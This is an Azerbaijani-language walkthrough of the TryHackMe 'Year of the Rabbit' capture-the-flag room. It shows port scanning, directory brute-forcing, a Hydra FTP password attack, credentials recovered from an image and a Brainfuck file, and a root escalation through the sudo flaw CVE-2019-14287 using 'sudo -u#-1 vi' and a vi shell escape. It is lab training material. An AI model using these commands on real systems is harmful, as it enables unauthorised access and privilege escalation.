# TryHackMe — Year of the Rabbit | Writeup (Azərbaycanca)

> **Çətinlik:** Asan  
> **Kateqoriya:** CTF / Boot2Root  
> **Mövzular:** Veb enumerasiya, Steqanoqrafiya, FTP, SSH, Privilege Escalation  
> **Məqsəd:** `user.txt` və `root.txt` bayraqlarını tapmaq

---

## Xülasə

Bu otaqda hədəf sistemdə açıq olan veb server, FTP və SSH xidmətlərini ardıcıl olaraq araşdırırıq. Gizli qovluqlar tapır, şəkil faylından FTP etimadnaməsi çıxarır, Brainfuck kodlaşdırmasını açır, SSH vasitəsilə daxil oluruq və nəhayət `sudo` konfiqurasiyasındakı boşluqdan (CVE-2019-14287) istifadə edərək root hüququ əldə edirik.

---

## 1. Kəşfiyyat (Enumeration)

### Nmap Skanı

İlk addım olaraq hədəf maşındakı açıq portları müəyyən etmək üçün nmap skanı aparırıq:

```bash
sudo nmap -sS -sV -p- <HEDEF_IP>
```

**Nəticə:**

| Port | Protokol | Xidmət         | Versiya              |
|------|----------|----------------|----------------------|
| 21   | TCP      | FTP            | vsftpd 3.0.2         |
| 22   | TCP      | SSH            | OpenSSH 6.7p1 Debian |
| 80   | TCP      | HTTP           | Apache 2.4.10        |

Üç açıq port aşkar edildi: **FTP (21)**, **SSH (22)** və **HTTP (80)**.

İlk olaraq FTP-yə anonim giriş cəhdi edirik:

```bash
ftp <HEDEF_IP>
# istifadəçi: anonymous
```

Anonim giriş rədd edilir. Odur ki, diqqəti veb serverə yönəldirik.

---

### Veb Enumerasiya (Gobuster)

Port 80-ə daxil olduqda standart **Apache2** başlanğıc səhifəsini görürük. Gizli qovluqlar tapmaq üçün Gobuster ilə qovluq tarama aparırıq:

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/big.txt
```

**Tapılan:** `/assets` qovluğu

`/assets` qovluğuna baxdıqda iki fayl görürük:

- `RickRolled.mp4` — yönəltmə tələsi (red herring)
- `style.css` — **maraqlı bir şey gizlidir!**

`style.css` faylının içini yoxlayırıq. CSS-in şərhlərinin içində gizli bir səhifəyə istinad tapırıq:

```
/sup3r_s3cr3t_fl4g.php
```

---

### Gizli PHP Səhifəsi

Brauzerdə `/sup3r_s3cr3t_fl4g.php` səhifəsinə daxil olduqda: *"JavaScript-i söndür"* mesajı görünür. JavaScript aktiv olduğu halda yönlənmə baş verir.

JavaScript-i yan keçmək üçün `curl` istifadə edirik:

```bash
curl -v http://<HEDEF_IP>/sup3r_s3cr3t_fl4g.php
```

HTTP cavabında **Location** başlığında başqa gizli bir qovluq görürük:

```
Location: /WExYY2Cv-qU
```

Bu qovluğa daxil olduqda `Hot_Babe.png` adlı şəkil faylı tapılır.

---

## 2. Steqanoqrafiya — Hot_Babe.png

Şəkil faylını endirib `strings` əmri ilə içindəki mətn məlumatlarına baxırıq:

```bash
wget http://<HEDEF_IP>/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png
```

`strings` çıxışında aşağıdakılar üzə çıxır:

- **FTP istifadəçi adı:** `ftpuser`
- **Potensial parol siyahısı** (bir neçə kandidat parol)

Bu parol siyahısını bir fayla yazıb FTP brute-force hücumuna hazırlaşırıq.

---

## 3. FTP — Hydra ilə Brute Force

Tapılan parol siyahısını `ftp_pass.txt` faylına yazıb Hydra ilə FTP brute-force edirik:

```bash
hydra -l ftpuser -P ftp_pass.txt ftp://<HEDEF_IP> -V -f
```

Hydra düzgün parolu tapır. FTP-yə daxil oluruq:

```bash
ftp <HEDEF_IP>
# istifadəçi: ftpuser
# parol: <tapılan_parol>
```

FTP serverindəki faylları siyahılayırıq:

```
ls -la
```

`Eli's_Creds.txt` faylını tapırıq. Faylı endiririk:

```bash
get "Eli's_Creds.txt"
```

---

## 4. Brainfuck — Eli'nin Etimadnaməsinin Açılması

`Eli's_Creds.txt` faylının içi adi mətn deyil — `+ - < > [ ] . ,` simvollarından ibarətdir. Bu **Brainfuck** esoterik proqramlaşdırma dilinin sintaksisidir.

Brainfuck dekoderindən istifadə edərək (məsələn, [md5decrypt.net](https://md5decrypt.net/en/Brainfuck-translator/)) kodu açırıq.

**Nəticə:**

```
User: eli
Password: DSpDiM1wAEwid
```

---

## 5. SSH ilə Giriş — eli İstifadəçisi

Tapılan etimadnamə ilə SSH vasitəsilə sistemə daxil oluruq:

```bash
ssh eli@<HEDEF_IP>
```

Daxil olduqdan sonra bir mesaj görürük — root tərəfindən Gwendoline-ə yazılmış bir qeyd. Mesajda "leet s3cr3t hiding place" haqqında danışılır. Bu, növbəti addımımıza ipucu verir.

---

## 6. Yan Keçid (Lateral Movement) — gwendoline İstifadəçisi

`gwendoline`-in ev qovluğuna baxa bilmirik (icazə yoxdur). Odur ki, sistemdə `s3cr3t` adlı gizli qovluq axtarırıq:

```bash
find / -type d -name "*s3cr3t*" 2>/dev/null
```

**Tapılan:** `/usr/games/s3cr3t`

Bu qovluğun içindəki faylda **Gwendoline-in parolu** yazılıb. İstifadəçini dəyişirik:

```bash
su gwendoline
# parol: <tapılan_parol>
```

Gwendoline-in ev qovluğunda `user.txt` faylını oxuyuruq:

```bash
cat ~/user.txt
```

🚩 **User bayrağı əldə edildi!**

---

## 7. Privilege Escalation — Root Hüququ

### sudo İcazələrinin Yoxlanması

`gwendoline` hesabının sudo icazələrini yoxlayırıq:

```bash
sudo -l
```

**Çıxış:**

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Bu konfiqurasiya **CVE-2019-14287** boşluğuna həssasdır. Qayda `!root` ilə root-u bloklasa da, `-u#-1` parametri ilə bu məhdudiyyəti keçmək mümkündür — çünki UID `-1` kernel tərəfindən `0` (root) kimi şərh edilir.

### CVE-2019-14287 İstismarı

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

`vi` redaktoru açılır. İçindən shell açmaq üçün:

```vim
:set shell=/bin/bash
:shell
```

Artıq **root shell**-imiz var! Yoxlayırıq:

```bash
whoami
# root
```

Root bayrağını oxuyuruq:

```bash
cat /root/root.txt
```

🚩 **Root bayrağı əldə edildi!**

---

## Hücum Yolu Xülasəsi

```
Nmap skanı
    └─► HTTP (80) → /assets/style.css → /sup3r_s3cr3t_fl4g.php
            └─► curl ilə gizli yönləmə → /WExYY2Cv-qU/Hot_Babe.png
                    └─► strings → ftpuser + parol siyahısı
                            └─► Hydra brute-force → FTP girişi
                                    └─► Eli's_Creds.txt (Brainfuck)
                                            └─► SSH → eli
                                                    └─► /usr/games/s3cr3t → gwendoline parolu
                                                            └─► su gwendoline → user.txt 🚩
                                                                    └─► sudo -u#-1 vi → root shell → root.txt 🚩
```

---

## İstifadə Edilən Alətlər

| Alət      | Məqsəd                              |
|-----------|-------------------------------------|
| `nmap`    | Port skanı və xidmət aşkarlanması   |
| `gobuster`| Veb qovluq/fayl enumerasiyası       |
| `curl`    | JavaScript yönləməsini keçmək       |
| `strings` | Şəkil faylından mətn çıxarmaq       |
| `hydra`   | FTP brute-force hücumu              |
| Brainfuck dekoder | Şifrəli etimadnaməni açmaq  |
| `find`    | Sistemdə gizli qovluq axtarmaq      |
| `vi`      | CVE-2019-14287 istismarı            |

---

## Öyrənilənlər

- **Veb enumerasiya** zamanı CSS faylları da diqqətlə oxunmalıdır
- **curl** brauzer JavaScript yönləmələrini yan keçmək üçün faydalıdır
- **Steqanoqrafiya** — şəkil fayllarında `strings` ilə gizli məlumat axtarmaq lazımdır
- **Brainfuck** kimi esoterik dillər CTF-lərdə tez-tez istifadə olunur
- **CVE-2019-14287** — `sudo`-nun `!root` məhdudiyyəti `UID -1` triki ilə keçilə bilər
- Hər zaman **sistemdə gizli qovluqlar** axtarmaq vacibdir (`find` əmri)

---

*Writeup hazırlandı: TryHackMe — Year of the Rabbit (Easy)*
